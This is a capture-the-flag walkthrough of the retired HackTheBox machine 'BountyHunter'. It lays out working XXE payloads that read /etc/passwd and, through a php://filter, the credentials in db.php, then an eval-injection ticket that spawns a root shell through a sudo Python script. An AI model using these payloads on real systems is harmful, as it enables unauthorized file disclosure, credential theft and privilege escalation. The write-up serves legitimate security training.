*2021-10-23*

*kimm3*

# Walkthrough: BountyHunter
Platform: HackTheBox

Difficulty: Easy

Uploaded after retirement:
## Setup
![ll](assets/markdown-img-paste-20210826112245589.png)

```
script history/enum1
export IP=10.10.11.100; ping $IP
```

(Responds to ICMP echo)
## Scans and enumeration
```
sudo nmap $IP -p- -Pn -v -A -oA scans/nmap-init
```

![nmap-init](assets/markdown-img-paste-20211023105011786.png)

![index](assets/markdown-img-paste-20211023104944538.png)

![portalphp](assets/markdown-img-paste-20211023105046395.png)

![log-submit](assets/markdown-img-paste-20211023105056643.png)

`ffuf -u http://$IP/FUZZ -w sl/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -of md -o scans/fuff-indexdir.md`

Retrieves two interesting findings that we haven't seen:
- resources folder
- dp.php

![resources](assets/markdown-img-paste-20211023105345205.png)

![readmetxt-tasks](assets/markdown-img-paste-2021102310535424.png)

That README.txt is full of hints. The test account is a possible attack vector.

![bountylog](assets/markdown-img-paste-20211029155721135.png)

'bountylog.js' contains a function to retrieve values from 'log_submit.php', base64 encode them and call another file 'tracker_diRbPr00f314.php'.

![dirbproof](assets/markdown-img-paste-20211029155522432.png)

Looks like a template for the info. Let's try a submit in browser.

![submit](assets/markdown-img-paste-20211023105620107.png)

This is the end result of process described above. Looking at the post request in burp, the actual POST request is made to 'tracker_diRbPr00f314.php' with base64 encoded XML data.

![base64d](assets/markdown-img-paste-2021102915532914.png)

db.php returns a blank page(allthough 200 OK).
### XXE
Checking for XXE vulnerability. Let's start with a simple ENTITY test.

Contents of plain text XML file:
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE test [<!ENTITY text "myveryowntext">]>
		<bugreport>
		<title>hej</title>
		<cwe>hejhej</cwe>
		<cvss>&text;</cvss>
		<reward>1234</reward>
		</bugreport>
```

`base64 *xmlfile* > base-test.txt`

Clean up new lines and replace special chars with the URL-encoded ones. There's two types:
- + replaced with %2B
- = replaced with %3D
(I just used Atoms search and replace)

![inspector1](assets/markdown-img-paste-20211030041316960.png)

Double check in inspector that the resulting XML is correct.

![entity-test](assets/markdown-img-paste-20211030041405626.png)

Numbers in score replaced with "myveryowntext", it works.

### XXE LFI
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE test [<!ENTITY text SYSTEM "file:///etc/passwd">]>
		<bugreport>
		<title>hej</title>
		<cwe>hejhej</cwe>
		<cvss>&text;</cvss>
		<reward>1234</reward>
		</bugreport>
```

![etcpasswd](assets/markdown-img-paste-20211029173041431.png)

One interesting user, 'development', the other non-standard don't have a shell/can't log in.

![inspo-xxe-php](assets/markdown-img-paste-20211030041634816.png)

Got inspiration with this example, let's try to get db.php with it. Tried the "normal" file parameter first, but didn't work.

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php">]>
		<bugreport>
		<title>&ac;</title>
		<cwe></cwe>
		<cvss></cvss>
		<reward></reward>
		</bugreport>
```

![decoed-dbphp](assets/markdown-img-paste-20211030042554809.png)
## Foothold
Trying to ssh to target with 'development'(found in '/etc/passwd') and the password in 'db.php' works.

![ssh-development](assets/markdown-img-paste-20211030043251127.png)

![usertxt](assets/markdown-img-paste-20211030043326388.png)
## Privilege Escalation
![sudo-l](assets/markdown-img-paste-2021103004345433.png)

![script](assets/markdown-img-paste-20211030045204982.png)

The script is not writable but we can run it as sudo. It does take user input, opens a file based on it, and it runs an eval() statement on a certain line in the file. So very much exploitable if we craft a correct ticket file.

Copied the script offline to play with it.

![modulus](assets/markdown-img-paste-20211030045630857.png)

To pass the modulus statement, it  has to begin with 200.

Valid eval code that will spawn a shell: `eval("__import__('pty').spawn('/bin/bash')")`.

Simply played around with the statements from the scripts and got a code that spawned a shell.

![python](assets/markdown-img-paste-2021103005123404.png)

Save to a file and did a test run. Contents:
```md
# Skytrain Inc
## Ticket to
__Ticket Code:__
**200+__import__('pty').spawn('/bin/bash')

```

And result:

![test](assets/markdown-img-paste-20211030051735505.png)


SEND IT

![nc](assets/markdown-img-paste-20211030051955638.png)

`nc -w 10.10.11.100 4444 < ticket.md`

![roottxt](assets/markdown-img-paste-20211030052131104.png)

## Post
![reset](assets/markdown-img-paste-20211030052407439.png)
